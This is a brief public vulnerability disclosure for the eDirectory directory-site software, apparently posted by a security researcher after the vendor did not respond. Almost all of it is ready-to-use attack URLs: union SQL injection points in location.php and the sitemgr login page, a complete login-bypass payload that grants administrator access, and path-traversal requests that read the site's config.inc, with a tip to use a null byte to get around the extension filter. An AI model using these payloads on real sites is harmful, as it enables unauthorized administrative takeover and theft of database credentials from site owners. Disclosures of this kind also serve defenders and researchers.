# eDirectory Multiple Vulnerabilities

Author: Efren Diaz @elefr3n

Vendor: https://www.edirectory.com/

Reported: ago/sep 2018 (without response :D)

Software Description: eDirectory is a software to create your own membership website, business directories, yellow pages, coupon sites, local guide, lead gen sites and more.

Version: All

## SQLi
Union SQLi:
```
http://site.com/location.php?type=byId&id=[INT]&childLevel=[INT]&level=[SQLi]
http://site.com/sitemgr/login.php?key=[SQLi]
```

## SQLi to login bypass
Sometimes returns "Invalid key error", then press F5 and you will logged as an administrator :)
```
http://site.com/sitemgr/login.php?key=' union select 0,1,0,'sitemgr' -- -
```

# Authenticated File Dissclosure
Only files with .php extension, but don't forget try nullbyte to avoid that :D
```
http://site.com/sitemgr/langcenter/language_file.php?language_area=front&domain_id=1&language_id=../conf/config.inc
http://site.com/sitemgr/configuration/geography/language/language_file.php?language_area=front&domain_id=1&language_id=../conf/config.inc
```
